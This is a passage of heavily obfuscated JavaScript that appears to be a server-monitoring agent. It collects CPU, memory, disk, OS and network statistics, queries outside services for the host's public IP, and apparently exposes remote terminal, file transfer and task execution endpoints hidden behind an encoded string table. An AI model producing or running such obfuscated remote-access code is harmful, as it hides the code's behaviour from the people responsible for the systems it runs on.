        'x3n0yxr1C19MzxrJAf9WCM9TAxnL',
        'DhLWzq',
        'DxnLza',
        'CMvSzwfZzq',
        'z2r5tvi',
        'yM9KEq',
        'uxfeA3q',
        'C3LZDgvTAw5MB3jTyxrPB24',
        'EMDczhK',
        'x2jHC2vPBMzVx2nHy2HL',
        'mJu1mJHttfzjtKq',
        'Dg9tDhjPBMC',
        'ls0Tls1cruDjtG',
        'DxnL',
        '4P2mioE7IoERR+s8MUIVNEw8GUw4UdOG',
        'Cdi1nG',
        'w1DbuK5Die5VAxnLifDbu00GBw9KDwXLigzHAwXLzcb0BYbSB2fKoG',
        'zNPqrg4',
        'AgvHzgvYCW',
        'DhjeB0u',
        'Ec1Kzwj1zW',
        'rNjnChG',
        'B0vctuS',
        'AgvHzgvY',
        'ihn0yxj0zwqGB24G',
        's1DWqui',
        'Bg9Hza',
        'u3LZDgvTsw5MB0nVBgXLy3rVCIbPBML0AwfSAxPLza',
        'yxbWBhK',
        'wez1BKq',
        'y2f0y2G',
        'nhWYFdb8nxWZFde',
        'DMX2r3q',
        'sfzRufK',
        'y3jVBMXVB3a',
        'BgfZDe5LDhDVCMTtDgf0CW',
        'tevwruXt',
        'C2Pwrei',
        'l2fWAs90yxnRl2XVzY9JCM9U',
        'x2HHBMrSzvjHD01LC3nHz2u',
        'Ec1MAwXLlxnPEMu',
        'zw5JB2rPBMC',
        'vNn3vNG',
        'Cxvzwxu',
        'tKT2vfi',
        'l2fWAs9MAwXLl25LDW',
        'zwnPzxnqDwjRzxK',
        'l2fWAs93CY8',
        'BfLnBuO',
        '8j+uHcbBq2fJAgvDiejHC2vjBMzVioE8K+wTMow3SUI/H+ACN++8Jow3SUMhJEAwSoIWG+w6PUEZU+E7N+I1HoA6KoI/M+IHJoABToAwSooaGG',
        'runjrvnFufvcs0vz',
        'zgvIDwC',
        'wfPfDhu',
        'rMfPBgvKihrVihbHCNnLifvstcbMCM9T',
        '8j+tPIbBq2fJAgvDiejHC2vjBMzViowrVEs4REACIEAvIoE8K+wTMo+8JoEBToAoPEI+K+whUUoaGG',
        'DhjPBq',
        'BgLZDezPBgvZ',
        'Dxzuqwi',
        'zhHdrKm',
        'C3rHCNrZv2L0Aa',
        'Ahr0Chm6lY9PCgLUzM8UAw8VAxa',
        'v0fstG',
        'x3bYB2nLC3nuzxjTAw5HBe1LC3nHz2u',
        'quDftLrFufjjvKfurv9lrvK',
        'BwfPBG',
        'wuDvyLG',
        'Ec1LBMnYExb0zwq',
        'q29UDgvUDc1mzw5NDgG',
        'v19psW',
        'zg93BMXVywrgAwXL',
        'zurgqK8',
        'ufjptvbux0nptu1btKq',
        'zgf0yq',
        'u3bSAxq',
        'ic0Tls0GzxHPDgnVzgu9',
        'uKTKwfa',
        '8j+sPsdLKk/LIQJNU4JNQ6/LPlhOTku6ia',
        'rKLmrv9st09u',
        'C3DHChvZzwq',
        'l2fWAs90yxnRl29UzxrPBwuVzxHLy3v0zq',
        'DgvYBwLUywW',
        'Dg90ywW',
        'vwLbq04',
        'z2v0tg9JywXjuhy2',
        'tK9ju0vFqunusu9ox1nqteLu',
        'uc0Ynty',
        'l2fWAs93CY8Q',
        'A3vIzxbVzhm',
        'z2v0',
        'nhWXmhW2Fdv8ohWWFdn8mNWXFdD8oq',
        'DuvTBfy',
        'runeu0fFufvcs0vz',
        'CMvJDKnPCgHLCG',
        'y0DwAey',
        'y2XVC2u',
        'CgHHC2u',
        'rg9JA2vY',
        'l3n5CY9MCY9Jz3jVDxaVBwvTB3j5lMn1CNjLBNq',
        'y21K',
        'BwrxqLG',
        'DMnYDLC',
        'B25LDgLTzxrHC2TZx2XVzW',
        'B3njBMzV',
        'tuDNExO',
        'Dg90ywXFy2H1BMTZ',
        'uhLyz1e',
        'wuvKvMG',
        'zw50CMLLCW',
        'C3rHDfn5BMm',
        'Dgv4Da',
        'CgvYBwLZC2LVBNm',
        'x2DLBMvYyxrLuMf3s2v5CgfPCG',
        'DeTUtuu',
        'Ahr0Chm6lY92nI5PzgvUDc5Tzq',
        'sw52ywXPzcbJCM9Uigv4ChjLC3nPB25ZoIa',
        'CxvLCNK',
        'wfb5qKi',
        'ENfTvKG',
        'tNb4rhC',
        'Chr5uhjVy2vZCW',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTtwv0Ag9KCW',
        'l2fWAs9MAwXLl2f1DgHVCML0Eq',
        'DMvYAwz5u2LNBMf0DxjL',
        'uMHLz3y',
        'wxf5rwK',
        'D3DHtKC',
        'vufcsNK',
        'y3btEw5J',
        'q09ovfjptf9qvujmsunFs0vz',
        'y3jLyxrLrgLYzwn0B3j5',
        'qwnJzxnZlunVBNrYB2WTrxHWB3nLluHLywrLCNm',
        'C3DHCa',
        'zfvPz04',
        'C2vZC2LVBL9RzxK',
        'y29UDgvUDa',
        'DxnLtM9PC2u',
        'y3jVBG',
        'zMv0y2Hjua',
        'q3jLyxrPBMCGrxHWCMvZCYbHChaUlI4',
        'BfLVEwy',
        'v29cq3e',
        'EhrLCM0TmJu2y29SB3i',
        '6k6/6zEUia',
        'B25eyxrH',
        'y3jLyxrLuhvIBgLJs2v5',
        'rNzWuuS',
        'AM9PBG',
        'l2fWAs9MAwXL',
        'z3b1x25HBwu',
        'vw5JyxvNAhqGrxHJzxb0Aw9UoG',
        'zgLYzwn0B3j5',
        'sevbra',
        'Ahr0Chm6lY9JAgvJA2LWlMfTyxPVBMf3CY5JB20',
        't21tv3a',
        'z2v0tg9Nu3vTBwfYEq',
        'zMfTAwX5',
        'zKTbtfa',
        'vw9VBNi',
        'CgfNt2u',
        'CM1KAxjtEw5J',
        'twLZC2LUzYbYzxf1AxjLzcbbrvmTr0nnigzPzwXKCYaOBM9Uy2uSihrHzYWGy2LWAgvYDgv4DcKGAw4GCgf5Bg9Hzc4',
        '4PQG77Ipievdrfnb5ywS6zkL5yQG6l295AsX6lsLoIa',
        'C3bSAwnL',
        'EMPzz2W',
        'B1fUAM0',
        'yMfZzty0DxjS',
        'u2H1DhrPBMCGzg93BI4UlG',
        'sg5lv0K',
        'Dg9cExrLqxjYyxK',
        'q2TNvei',
        'wefhrfC',
        'CMvKDwnL',
        'CxPeBKy',
        't0XTzvC',
        'y29Kzq',
        'y29WEuzPBgvtEw5J',
        'z2v0q3jVBLrHC2TZ',
        'C2v0t25LDgLTzvrHC2TZ',
        'ywrKCMvZCW',
        'C3rKzxjY',
        't1bwrLa',
        'z2v0tg9JywXjuhy0',
        'DgDzs1C',
        'sw5PDfrHC2S',
        'C2vUzenPCgHLCG',
        'Ec1VCMLNAw5HBc1WyxrO',
        'mJm1ntuYmKDTB3PNBq',
        'DhHFyNL0zxm',
        'DgnW',
        'yMfZzw5HBwu',
        'icaG4OcIia',
        'veHftNO',
        '5yQG5A+g5O+H5OMl5AsX6lsL',
        'ChjVy2vZCW',
        'Ahr0Chm6lY9HCgK2lMLWAwz5lM9YzW',
        'l2rVy2TLCI9JB250ywLUzxjZlW',
        'uwzzzfG',
        'DgfN',
        'zNjVBuj5DgvZ',
        'y2X1qKi',
        '8j+sPsbBuMvZCg9UC2uGrw5JCNLWDf06ia',
        'DxbKyxrL',
        'C3bvAe4',
        'DMfSAwrHDgu',
        't1busu9ouW',
        'Ag9TzwrPCG',
        'zgvJCNLWDa',
        'z2vUzxjHDgvqywLY',
        'DhmTBM9Kzq',
        'x2DLDenVBMzPz1zHBhvL',
        'A2vYBMvS',
        'v2L5C1m',
        'u2v0DgLUzYb1CcbxzwjtB2nRzxqGDgvYBwLUywWGCM91DguUlI4',
        'wNP4BMG',
        'y29UDgvUDc10ExbLlcb1C2vYlwfNzw50lgf1DgHVCML6yxrPB24SihGTBM9Uy2uSihGTDgLTzxn0yw1Wlcb4lwf1DgGTDg9Rzw4SihGTywvZlwvUy3j5ChrLzcWGEc1Kzwj1zW',
        'y2zoD24',
        'zKDZuKG',
        'B25fEgL0',
        'y2LWAgvYDgv4Da',
        'yuzlA1C',
        'twf0y2HLzcbtDwiTCgf0AdOG',
        '8j+tPIbBq2fJAgvDifn0yxr1CYdLKB3KUk3NM5hMJQFNVjpLRzJJGii',
        'swDhvfy',
        'thPKBeu',
        'x3jLy2vPDMvxC0j5DgvZ',
        'y3jVBNrHC2TZx2XVzW',
        'A2LSBgvK',
        'vLzSELK',
        'ChjVBwLZzxm',
        'BLP6qMC',
        'DuXbCMG',
        'y29UDgfPBMvYpwX4yW',
        'A1PuCK4',
        'u2vWy24',
        '4PQG77Ipievdsuvt5ywS6zkL6kEJ56cb5AsX6lsLoIa',
        'w/cFMQGG5lIL6yEn6k2M5zgkxsbymJu1mtKG5A+g6zkL6zw/5BQM6z2EidmYiowTL+IkGU+8Je5VAxnLiownJ+IURUw/HEwUMUw0QEA6G++8Gq',
        'CNHFyNL0zxm',
        'y29UBMvJDgLVBNm',
        'y2HPBgrFChjVy2vZCW',
        'B21PB2W',
        '8j+uJcdNU4JNQ6/OV5VNQiVPGidLH7OGkenVzgu6ia',
        'Ahr0Chm6lY9TEwv4DgvYBMfSAxaUy29Tl3jHDW',
        'D3jPDgfIBgu',
        'zxHPC3rZu3LUyW',
        'yu1XvMi',
        'l3n5CY9MCY9Jz3jVDxaVBwvTB3j5l21LBw9YEs51C2fNzv9PBL9IExrLCW',
        'uMvHze1LC3nHz2u',
        'EvfevK8',
        'v2vIu29JA2v0ihjVDxrLignVBMzPz3vYzwq',
        'u0Lhsu5uigHHBMrSzxiGCMvNAxn0zxjLza',
        'vMTOwvq',
        't2PyEwW',
        'rgLowuG',
        'CMvSyxrPDMu',
        'DxrMoa',
        'uNHxDwO',
        'r2v0qwn0Aw9U',
        'mtaYnJa1nePcu253DG',
        'yujHB1K',
        'B25LDgfZA3m',
        'ChjVy2vZC0HHBMrZAgfRzq',
        'sK9XDLO',
        'qgX5zgvSBc9UB2rLlxb0Eq',
        'vevstq',
        't1bftG',
        'zw5K',
        'Bw9Kzv9Vy3rHBa',
        'zxHLy3v0ywjSzq',
        'shzQz20',
        'zNjVBq',
        'x2zVCM1HDeXVz0vUDhj5',
        'zNjVBuj5DgvbCNjHEq',
        'Ec1LBMnYExb0zwqSihGTywDLBNqTDMvYC2LVBIWGEc1MAwXLlxnPEMuSihGTB3jPz2LUywWTCgf0Aa',
        'y2XLyw51Ca',
        'DgLTzw91Da',
        'tK9ju0vFs0vz',
        'vMPOzwG',
        'x2jHC2vPBMzVx2nHy2HLx3rPBwu',
        'Bg9N',
        'DfvOtu4',
        'DMrywwy',
        '8j+sPsdMJ6hMIyVLPlhOTkxOR6BMG4u6ia',
        'A2LSBa',
        'uxDnv0C',
        'u3rHCNrPBMCGBwfPBIGPigz1BMn0Aw9UlI4U',
        'AhDlAKW',
        'ChjVDg9JB2W',
        '8j+AGcblAxnHBweGqwDLBNqGtM9Kzs5QCYb2',
        'u0HbmJu2',
        'sw52ywXPzcbIB2r5igzVCM1HDdOG',
        'y2LWAgvY',
        'x2fWCgvUzeXVzW',
        'C2XPy2u',
        'C3DHChrVDgfS',
        'twLZC2LUzYbHDxrOigHLywrLCNm',
        'Dgv4Dc9WBgfPBG',
        'DMvYAwz5',
        'EgDJwKK',
        'Dg9cExrLCW',
        'z2v0t25LDgLTzuXVz3m',
        'Ec1UB25Jzq',
        'mZyWma',
        'rhDzt2e',
        'qKX0C0u',
        'l2fWAs9MAwXLl2XPC3q',
        'teforW',
        's0LQu1O',
        'nhW2Fdf8nxW3Fdj8m3WW',
        's1DhDe0',
        'AuTYA2S',
        'y3jLyxrLrgvJAxbOzxjPDG',
        'C3rVCa',
        'A2LZyw1Hx3rLCM1PBMfSx3yX',
        'mc4YlJmTANm',
        'u0TPCMi',
        'CMvJDxjZAxzL',
        'ywn0AxzL',
        'yxbWBgLJyxrPB24VB2n0zxqTC3rYzwfT',
        'quDftLrFvKvsu0LptG',
        'q1jptL9dsevds19jtLrfuLzbta',
        'vu11rKO',
        'wc1uAw1LC3rHBxa',
        'suDiBMy',
        'ywjZ',
        'mc4WlJaUma',
        'CMnXufu',
        'qKv6uLO',
        'Aw5WDxq',
        'Ahr0Chm6lY9HCgKUAxbPzNKUB3jN',
        'Bw9Kzq',
        'BwvT',
        'zxHPDa',
        'l2fWAs9ZDgf0Dxm',
        'sKPLqMK',
        'DgHLBG',
        'x2DLDenVBM5Ly3rPB25Z',
        'CMfmugO',
        'yNL0zuXLBMD0Aa',
        'CMvZAxPL',
        'AxnwywXPzeLqDJq',
        'tLjiDg4',
        'DxjS',
        'zMfSC2u',
        'EfnVAMe',
        'D2fYBG',
        'cVcFKQeG6kEJ5yAZ5PA55RovoG',
        'C3bcuw4',
        'vxPoq1y',
        'x2jHC2vPBMzVx2zLDgnOx3bYB21PC2u',
        'zM5jC3K',
        'BwvTx3rVDgfS',
        'rxHWCMvZCYbHChaGy3jLyxrLzcbHBMqGzxHWCMvZC1DZigfWCgXPzwq',
        'uL9psW',
        'y0XNsxu',
        'C3rKB3v0',
        'icaGms4G6k6+572U546V5Akd5y+y6yEpoIbLEhbVCNqGruneu0fFufvcs0vzpsCTls0Tlujfr0LoifbvqKXjqYblrvKTls0TlsCUlI4N',
        'z2v0uhvIBgLJsxbwna',
        'yxjJAa',
        'AhrtruK',
        'y1j3zw8',
        's0DwyLm',
        'sK1MAxu',
        'B3DUzxi',
        'CMvHzgrPCLn5BMm',
        'Dg9mB3DLCKnHC2u',
        'Dg1xDKS',
        'A29muMO',
        'zw52',
        'BwvYz2u',
        'ywnJzxnZu3LUyW',
        'Bvbhv0S',
        'sgHHz0q',
        'tuXQCLi',
        'yxzNtg9Hza',
        'mJG1otG4nwnRy3zYCG',
        'ENvzzey',
        'iowKSEI0PtOG',
        '4PYfie5VAxnLioApOEAjI+wUJoAiKo+8JoERR+wiSoERR+wkOowVHUMaMUMbK+w3SUw7UUERI++8Gq',
        'vgLTzxn0yw1Wigv4CgLYzwq6igrPzMy9',
        'zM9YrwfJAa',
        'BgLZDgvU',
        'A2v5CY9Hz2vUDf9Ly2rZyv9WDwiUCgvT',
        'Agj6zuC',
        'ChjPDMf0zv9InJq',
        'ywXS',
        'mtaW',
        'z3zPqvy',
        'CNzYtuW',
        'su9mthi',
        'CMvHzhLtDgf0zq',
        'Ec10Aw1LC3rHBxa',
        'wMT5tKu',
        'AxnwywXPzeLqDJy',
        'reLZDha',
        'zxjYB3i',
        'teHyCfK',
        'CKXKy20',
        'BMv0D29YA0LUDgvYzMfJzxm',
        'rvvAsKy',
        'zwnPzxnQCW',
        'ruPnq2C',
        'y3DK',
        'DxLJtem',
        'DvbsD0W',
        'twLZC2LUzYbYzxf1zxn0x2LK',
        'y2XLyxjdCM9Utg9NCW',
        'ywHluMy',
        'Ewzbz0m',
        'wgrqzNa',
        'y3jLyxrLvMvYAwz5',
        'CMvZB2X2zq',
        'q0vOB0i',
        'B2jcBha',
        'vwTnzMK',
        'qY5vveyToa',
        'ywXSB2m',
        '5lIj5QYH5O+H5OMl5lQK5lQs5zco5lUn5PYQ6l+B5ywLievZDgfIBgLZAgvKioEkTUAaGq',
        'zNvUy3rPB24',
        'y29SCW',
        'CxrMwxC',
        'EuHlufG',
        'zxHWB3j0',
        'CMvHzgfIBgu',
        'Efvdr3m',
        'y2H1BMTF',
        'Eu9uDva',
        'Aw5JBhvKzxm',
        'BM9PC2uTyY53yxnT',
        'BwTKAxjtEw5J',
        'sfL1yKC',
        'A21ysNa',
        'BK9rALC',
        'g1S5mg1BrevcvuDDg1SWBsa',
        'z2v0uMvHBhrPBwvjBMzV',
        'svb2nG',
        'zKLqt1G',
        'Dg90ywXozxr3B3jRrg93BG',
        'AxnrA0S',
        'x3bHCNnLtw9Kzq',
        'uwHgv3O',
        'uNrPBwvVDxq',
        'BMfTzq',
        'z2vUzxjHDgvtAw5NBgu',
        'CNfJDhm',
        'AxnbCNjHEq',
        'r1vdwhC',
        'Axb2nG',
        'n0zdv3D5vq',
        'qg5VyMXLl2n1CNzLCY9UAxn0lMPZ',
        'u3nOqMW',
        'q29UDgvUDc1uExbL',
        'zxHPDgnVzgu',
        'C3rHDhvZq29Kzq',
        'yNbuwMC',
        'zxHLy3v0zq',
        'x3n0yxr1C19JywnOzv90Aw1L',
        '8j+uJcdLRQlMIlFNQ6/KUlVLIQJMLQ3LVia',
        'lNvWBg9Hzf9JAhvUA3m',
        'Ec1Hz2vUDc12zxjZAw9U',
        'C2v0rMLSzvbLCM1PC3nPB25Z',
        'AuHpuM8',
        'l2fWAs9IyxnLAw5MBW',
        'zKr5rw4',
        'Dhj1zq',
        'C2vUza',
        'DKHtteW',
        'BM9PC2vFA2v5',
        'l3bVzhmV',
        'Bg9JywXqCML2qJy0',
        'B2jQzwn0',
        'tKTwzgy',
        'Bw92zv9Tyxa',
        't1zLDwm',
        'uvf3zK4',
        'sw5PDgLHBgL6Aw5NienYExb0B01HBMfNzxiUlI4',
        'zvHWwvu',
        'ze9is2e',
        't1Lur0K',
        'zgvSzxrL',
        'C2L6zq',
        'qwnJzxnZigrLBMLLzdOGCgf0AcbVDxrZAwrLihjVB3q',
        'runjrvnFufvcteLdx0Tfwv9qru0',
        'q2XLyw5SEsbJBg9Zzwq',
        'rvjst1i',
        'zMLSzq',
        'ug9KBwfU',
        'y1HIzei',
        'Aw5PDa',
        'l2fWAs9MAwXLl2rVD25SB2fK',
        'y291BNq',
        'veLnrvnuqu1qx1DjtKrpvW',
        'AgfUzhnOywTLrMLUAxnOzwq',
        'wevkA1K',
        'AxneAxjLy3rVCNK',
        'DvPIAwW',
        'A2v5CW',
        'tK9ju0vFs0vzu19jtLrfuK5bta',
        'runeu0fFufvcs0vzoIdMNkRORR7NVA7NJQ/LOOpLJ5JPH4/KUjtMLOFKU7yGA2v5CY9Hz2vUDf9Ly2rZyv9WDwiUCgvTios4JEwTMowCQa',
        'AeXvAha',
        'Dg1WzNm',
        'CLzKt0i',
        'DKHnDNq',
        'DLHPA2q',
        'sen4yK4',
        'uwjVvLe',
        'ug9PBNq',
        'zNntAxPL',
        'BNrbv08',
        'z2v0uhvIBgLJsxbwnG',
        'DxjSzw5JB2rLza',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTt3jPz2LU',
        'y3jVBNrHC2TZ',
        'CMvHzezPBgvtEw5J',
        '8j+uHcbBq2fJAgvDifn0yxr1CYdLRP7ML7BNM5hMJQFNVjpLRzJLT7lOV4FMNj/VViZLT7lPH43MLRdNLj/MIjdLUQBPH4/LV6VNHAFJGii',
        'DMvYC2LVBG',
        'DxbNCMfKzq',
        'y2HTB2rtEw5J',
        'rMf0ywWGzxjYB3iGAw4GBwfPBIGPoG',
        'l2fWAs9MAwXLl2nW',
        'C2nOzwr1Bgu',
        '6k+35Rgc6lAf5PE2',
        'D0DiCuW',
        'x2LZqMLUyxj5',
        'Dg90ywXozxr3B3jRvxa',
        'sw5PDgLHBgL6Aw5Nifn5C3rLBuLUzM9dB2XSzwn0B3iUlI4',
        'x3n0yxr1C19JywnOzq',
        'z21puK0',
        'wc1oB25Jzq',
        'DxrMltG',
        'mxWWFdH8m3W1Fdj8n3W2FdL8na',
        'A1n2CuW',
        'w1DbuK5Diev4y2vWDgLVBIbSB2fKAw5Nie5VAxnLig1VzhvSztO',
        'r0LKwue',
        'ywnJzxnZx2rLBMLLza',
        'm3W4Fdv8mxWXmxWXnhW2Fdj8mtn8nhWXmhWXnxW3Fdb8oxWXmG',
        'l3j1BI8Uy29UDgfPBMvYzw52',
        'Edi1nte5',
        'tM9PC2uGv0fttsbTB2r1BguGBg9HzgvKihn1y2nLC3nMDwXSEq',
        'BNvTyMvY',
        'x3nWBgL0qw5KrMLUAxnO',
        'tfHd',
        'BwLU',
        'Dw5KzwzPBMvK',
        'Ec1HzxmTzw5JCNLWDgvK',
        'CMvZDwX0',
        'q25fqui',
        'zw5JCNLWDa',
        'zgvZDhjVEq',
        'yNvUlxb0Eq',
        '5O+H5OMl5PYQ5A6m5OIq77Ym5PEG5Rov5yQG5A+g5PwW5O2U',
        'te9hx0XfvKvm',
        'C1zeC2S',
        'z2v0qxzHAwXHyMXLu2HLBgW',
        'ugf0AcbUB3qGzM91BMq',
        'x2nOzwnRqwnJzxnZ',
        'rKLmrv9bvurjvf9mt0C',
        'rgvJCNLWDfDPDgHbza',
        'D0rMyLK',
        'vuvVCeq',
        'Ahr0Chm6lY9Py2fUAgf6AxaUy29T',
        'y3vYCMvUDeXLDMvS',
        'twLZsKO',
        'q1n0shq',
        'ntbTyG',
        'BgfZDe5LDhDVCMTuAw1L',
        'zwnKC2fqDwjRzxK',
        'g1SZmw1BrKfuquWGrvjst1jDg1SWBsdOR6BNU4BPLjNOR686ia',
        'Ec1HDxrOlxrVA2vU',
        'zw5JCNLWDfjLC3bVBNnL',
        'tufyx1rbu0TFte9hx1njwKu',
        'tK9ju0vFqunusu9ox1jfqurFtuvtu0fhrq',
        'AgvHCNrIzwf0',
        'BffmtvC',
        'BxrPBwu',
        'y3jVBKPVyNm',
        'tfbewNe',
        'su5gtW',
        'vwXVEvO',
        'l3bYB2mVC2vSzI9TB3vUDgLUzM8',
        'CMvXDwvZDeLK',
        'zxLk',
        'zNjLzq',
        'BgLTAxq',
        'z2v0q3jVBKXVz3m',
        'Ahr0Chm6lY9PzMnVBMzPzY5Tzs9PCa',
        'refqCve',
        'z1DZzNq',
        'CgfKu3rHCNq',
        'Aw50zxjUywW',
        'ExrYAuC',
        'C3DHCf90B3rHBa',
        'l2rLDI8',
        'ANbtvve',
        'y29UC3rHBNrZ',
        'C29Tzq',
        'twLZC2LUzYbJAhvUAYa',
        'zgvSzxrLrMLSzxm',
        'ue9sva',
        'AgfUzhnOywTL',
        'l3bYB2mVy3b1Aw5MBW',
        'DwLK',
        'z3Dxrxm',
        'Axnoyu4',
        'u1btAve',
        'Axb2na'
    ];
    a0a = function () {
        return c8;
    };
    return a0a();
}
class a0H {
    constructor() {
        const al = a0T;
        this['lastNetworkStats'] = {
            'rx': 0x0,
            'tx': 0x0
        }, this['totalNetworkUp'] = 0x0, this['totalNetworkDown'] = 0x0, this['lastNetworkTime'] = Date[al(0x48c)]() / 0x3e8;
    }
    async [a0T(0x49c)]() {
        const am = a0T, a = {
                'QfYdX': 'utf8',
                'QbLRn': function (d, f) {
                    return d === f;
                },
                'iHORo': function (d, f, g) {
                    return d(f, g);
                },
                'bGxGN': am(0x22d),
                'cRweo': function (d, f, g) {
                    return d(f, g);
                },
                'UuWxo': '/sys/fs/cgroup/memory/memory.limit_in_bytes',
                'efQmN': am(0x2c1),
                'eXpYU': function (d, f) {
                    return d(f);
                },
                'FrMpx': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0i[am(0x44b)]('/sys/fs/cgroup/memory.max', a['QfYdX']))['trim']();
            b = a[am(0x466)](d, am(0x42b)) ? null : a[am(0x398)](parseInt, d, 0xa), c = a[am(0x398)](parseInt, (await a0i['readFile'](a[am(0x4df)], a[am(0x290)]))[am(0x203)](), 0xa);
        } catch {
            try {
                b = a[am(0x333)](parseInt, (await a0i[am(0x44b)](a[am(0x451)], am(0x2ca)))[am(0x203)](), 0xa), c = a[am(0x398)](parseInt, (await a0i[am(0x44b)](a['efQmN'], a['QfYdX']))[am(0x203)](), 0xa);
                if (b > 0x7ffffffffffff000)
                    b = null;
            } catch {
                const f = await a0n[am(0x316)]();
                b = f[am(0x21d)], c = f[am(0x4ee)];
            }
        }
        if (a[am(0x466)](b, null)) {
            const g = await a0n[am(0x316)]();
            b = g[am(0x21d)], (c === null || a[am(0x3a7)](isNaN, c)) && (c = g[am(0x4ee)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a[am(0x1e1)](b, c),
            'free': a['FrMpx'](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async ['getBasicInfo']() {
        const an = a0T, [a, b, c, d] = await Promise[an(0x34c)]([
                a0n[an(0x434)](),
                this[an(0x49c)](),
                a0n[an(0x232)](),
                a0n[an(0x359)]()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise['all']([
                this[an(0x330)](),
                this[an(0x3c8)]()
            ]);
        } catch (h) {
            a0u[an(0x1ff)](an(0x452) + h['message'], 0x1);
        }
        return {
            'arch': a0k['arch'](),
            'cpu_cores': a['cores'],
            'cpu_name': a['brand'],
            'disk_total': (await a0n[an(0x3c6)]())[0x0]?.[an(0x3ab)] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[an(0x21d)],
            'os': c[an(0x4a5)] + '\x20' + c[an(0x4ef)],
            'kernel_version': c[an(0x29e)],
            'swap_total': b[an(0x2f1)],
            'version': a0E[an(0x30a)],
            'virtualization': await this['_getVirtualization'](),
            'session_key': a0E[an(0x4be)],
            'noise_key': a0E['NOISE_KEY']
        };
    }
    [a0T(0x281)]() {
        const ao = a0T, a = {
                'nOQjW': function (c, d) {
                    return c === d;
                },
                'APGST': ao(0x49f)
            }, b = a0k[ao(0x359)]();
        for (const c of Object[ao(0x3bb)](b)) {
            for (const d of b[c]) {
                const f = a[ao(0x37b)](d[ao(0x267)], a['APGST']) || d[ao(0x267)] === 0x4;
                if (f && !d[ao(0x418)]) {
                    if (!/^10\./[ao(0x4d7)](d['address']) && !/^192\.168\./[ao(0x4d7)](d[ao(0x27e)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[ao(0x4d7)](d[ao(0x27e)]))
                        return d[ao(0x27e)];
                }
            }
        }
        return null;
    }
    async [a0T(0x330)]() {
        const ap = a0T, a = {
                'gwWEs': ap(0x314),
                'cLgIu': 'https://icanhazip.com',
                'uPRwL': ap(0x264),
                'wGHqL': 'https://ipecho.net/plain',
                'XAGDW': ap(0x208),
                'NOGAv': ap(0x2bd)
            }, b = [
                a[ap(0x425)],
                a[ap(0x32d)],
                a[ap(0x35f)],
                ap(0x414),
                a[ap(0x3d5)],
                a[ap(0x276)],
                a[ap(0x460)]
            ];
        for (const d of b) {
            try {
                const f = await this[ap(0x255)](d, 0x4);
                if (f && this[ap(0x31f)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[ap(0x281)]();
        if (c && this[ap(0x31f)](c))
            return c;
        return null;
    }
    [a0T(0x21f)]() {
        const aq = a0T, a = {
                'QwMWG': function (c, d) {
                    return c === d;
                },
                'vHMvt': aq(0x37e),
                'AmfVD': function (c, d) {
                    return c === d;
                }
            }, b = a0k[aq(0x359)]();
        for (const c of Object[aq(0x3bb)](b)) {
            for (const d of b[c]) {
                const f = a[aq(0x2e7)](d[aq(0x267)], a[aq(0x3c1)]) || a['AmfVD'](d['family'], 0x6);
                if (f && !d[aq(0x418)]) {
                    if (!d[aq(0x27e)][aq(0x338)]()[aq(0x207)](aq(0x4d6)))
                        return d['address'];
                }
            }
        }
        return null;
    }
    async [a0T(0x3c8)]() {
        const ar = a0T, a = {
                'oCAHX': ar(0x28e),
                'NKvTR': ar(0x3fb),
                'uZbil': ar(0x23d)
            }, b = this[ar(0x21f)]();
        if (b && this[ar(0x354)](b))
            return b;
        const c = [
            a['oCAHX'],
            a[ar(0x1f8)],
            a[ar(0x3ba)]
        ];
        for (const d of c) {
            try {
                const f = await this[ar(0x255)](d, 0x6);
                if (f && this[ar(0x354)](f))
                    return f;
            } catch (g) {
                a0u[ar(0x1ff)](ar(0x25a) + d + ar(0x344) + g[ar(0x476)]);
                continue;
            }
        }
        return null;
    }
    async ['fetchIP'](a, b = 0x0) {
        const as = a0T, c = {
                'Vctqx': as(0x214),
                'zQcJb': 'end',
                'EUZJF': function (d, f) {
                    return d(f);
                },
                'Uoonr': 'https',
                'NEWzx': as(0x2f3),
                'FnxPb': as(0x356)
            };
        return new Promise((d, f) => {
            const at = as, g = c[at(0x35a)](require, c[at(0x269)]), h = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c['NEWzx'] }
                }, i = g['get'](a, h, j => {
                    const au = at;
                    let k = '';
                    if (j[au(0x390)] !== 0xc8) {
                        f(new Error('HTTP\x20' + j[au(0x390)]));
                        return;
                    }
                    j['on'](c[au(0x4cb)], l => k += l), j['on'](c['zQcJb'], () => d(k[au(0x203)]()));
                });
            i['on'](c[at(0x46c)], f), i['setTimeout'](0x1388, () => {
                const av = at;
                i[av(0x3ef)](), f(new Error(av(0x3d4)));
            });
        });
    }
    [a0T(0x31f)](a) {
        const aw = a0T;
        return /^(\d{1,3}\.){3}\d{1,3}$/[aw(0x4d7)](a);
    }
    [a0T(0x354)](a) {
        const ax = a0T;
        if (!/^[0-9a-fA-F:]+$/['test'](a) || !a[ax(0x376)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i['test'](a))
            return ![];
        return !![];
    }
    async [a0T(0x37d)]() {
        const ay = a0T, a = {
                'yQDVO': function (m, n) {
                    return m / n;
                },
                'CStHt': function (m, n) {
                    return m - n;
                },
                'RxWuj': function (m, n) {
                    return m - n;
                },
                'CkgTB': function (m, n) {
                    return m / n;
                },
                'CEgek': function (m, n) {
                    return m * n;
                },
                'DIstp': function (m, n) {
                    return m / n;
                },
                'UloyZ': function (m, n) {
                    return m / n;
                },
                'obBlp': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[ay(0x34c)]([
                a0n[ay(0x4c5)](),
                a0n[ay(0x316)](),
                a0n[ay(0x4e5)](),
                a0n[ay(0x4c5)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[ay(0x2c3)](Date[ay(0x48c)](), 0x3e8), i = a[ay(0x3fe)](h, this[ay(0x400)]), j = g['tx_bytes'] - this[ay(0x1ef)]['tx'], k = a[ay(0x2cb)](g[ay(0x2b8)], this[ay(0x1ef)]['rx']);
